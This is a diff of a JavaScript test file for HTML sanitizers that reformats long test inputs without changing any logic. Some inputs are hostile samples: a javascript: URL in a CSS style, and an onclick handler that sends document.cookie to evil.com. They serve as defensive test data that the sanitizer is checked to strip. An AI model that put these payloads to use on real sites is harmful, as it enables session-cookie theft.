@@ -184,7 +184,8 @@ describe('sanitizeHtml', () => {
   });
 
   it('strips disallowed CSS properties from style attributes', () => {
-    const input = '<p style="position: fixed; top: 0; left: 0; width: 100%; z-index: 9999; background: url(javascript:alert(1))">Clickjacking attempt</p>';
+    const input =
+      '<p style="position: fixed; top: 0; left: 0; width: 100%; z-index: 9999; background: url(javascript:alert(1))">Clickjacking attempt</p>';
     const result = sanitizeHtml(input);
     // Dangerous CSS properties should be removed
     expect(result).not.toContain('position');
@@ -239,7 +240,8 @@ describe('sanitizeRichText', () => {
 
   it('handles TipTap-generated HTML safely', () => {
     // Typical HTML output from TipTap
-    const input = '<h2>Task Overview</h2><p>This task involves <strong>critical</strong> work.</p><ul><li><p>Step 1</p></li><li><p>Step 2</p></li></ul><blockquote><p>Note: Important milestone</p></blockquote>';
+    const input =
+      '<h2>Task Overview</h2><p>This task involves <strong>critical</strong> work.</p><ul><li><p>Step 1</p></li><li><p>Step 2</p></li></ul><blockquote><p>Note: Important milestone</p></blockquote>';
     const result = sanitizeRichText(input);
     expect(result).toContain('Task Overview');
     expect(result).toContain('Step 1');
@@ -292,7 +294,8 @@ describe('comment content sanitization', () => {
 
   it('strips event handlers from formatted comment text', () => {
     // An attacker uses clickjacking via formatted text
-    const input = '<p onclick="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">Click here for prizes!</p>';
+    const input =
+      '<p onclick="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">Click here for prizes!</p>';
     const result = sanitizeRichText(input) ?? '';
     expect(result).not.toContain('onclick');
     expect(result).toContain('Click here');
@@ -347,7 +350,8 @@ describe('comment content sanitization', () => {
   });
 
   it('handles multiline comment content with formatting', () => {
-    const input = 'First line\n\n<strong>Important:</strong>\n<ul><li>Point one</li><li>Point two</li></ul>';
+    const input =
+      'First line\n\n<strong>Important:</strong>\n<ul><li>Point one</li><li>Point two</li></ul>';
     const result = sanitizeRichText(input) ?? '';
     expect(result).toContain('First line');
     expect(result).toContain('<strong>Important:</strong>');
